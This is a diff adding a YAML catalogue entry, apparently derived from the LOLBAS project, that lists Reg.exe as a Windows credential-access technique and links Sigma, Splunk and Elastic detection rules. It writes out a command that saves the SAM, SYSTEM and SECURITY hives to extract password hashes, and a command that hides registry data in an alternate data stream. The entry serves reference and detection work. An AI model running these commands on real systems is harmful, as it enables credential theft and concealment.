@@ -1,0 +1,107 @@
+id: lolbas/T1NCaW5hcmllcy9SZWcueW1s/Q3JlZGVudGlhbHM/1
+type: binary
+platform: windows
+name: Reg.exe
+phases:
+- credential-access
+capabilities:
+- credential-access
+privilege_required: admin
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1003.002
+opsec:
+  noise: medium
+  triggers: reg.exe writing to an ADS
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml
+  - https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml
+  - https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml
+commands:
+- template: reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak}
+    && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
+  comment: Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Reg/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Reg.exe
+      category: Credentials
+      privileges: Administrator
+      mitre_id: T1003.002
+      source_file: OSBinaries/Reg.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Reg.exe\nDescription: Used to manipulate the registry\nAuthor: Oddvar\
+        \ Moe\nCreated: 2018-05-25\nCommands:\n  - Command: reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg\
+        \ {PATH_ABSOLUTE}:evilreg.reg\n    Description: Export the target Registry key and save it to\
+        \ the specified .REG file within an Alternate data stream.\n    Usecase: Hide/plant registry information\
+        \ in Alternate data stream for later use\n    Category: ADS\n    Privileges: User\n    MitreID:\
+        \ T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
+        \ Windows 11\n  - Command: reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM\
+        \ {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}\n    Description: Dump registry\
+        \ hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material\n    Usecase: Dump\
+        \ credentials from the Security Account Manager (SAM)\n    Category: Credentials\n    Privileges:\
+        \ Administrator\n    MitreID: T1003.002\n    OperatingSystem: Windows Vista, Windows 7, Windows\
+        \ 8, Windows 8.1, Windows 10, Windows 11\nFull_Path:\n  - Path: C:\\Windows\\System32\\reg.exe\n\
+        \  - Path: C:\\Windows\\SysWOW64\\reg.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml\n\
+        \  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml\n\
+        \  - IOC: reg.exe writing to an ADS\nResources:\n  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\
+        \  - Link: https://pure.security/dumping-windows-credentials/\nAcknowledgement:\n  - Person: Oddvar\
+        \ Moe\n    Handle: '@oddvarmoe'\n"
+      document_sha256: sha256:c70b8d36a9398e0902da99c7f0cac66d42413c80d5956bb022077280444f2fc5
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Reg/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1003.002
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: admin
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:1b62ab4ab38f33423d5adf961922b3f1e4712a24f4f37f9cce4dcac51a21bc0a
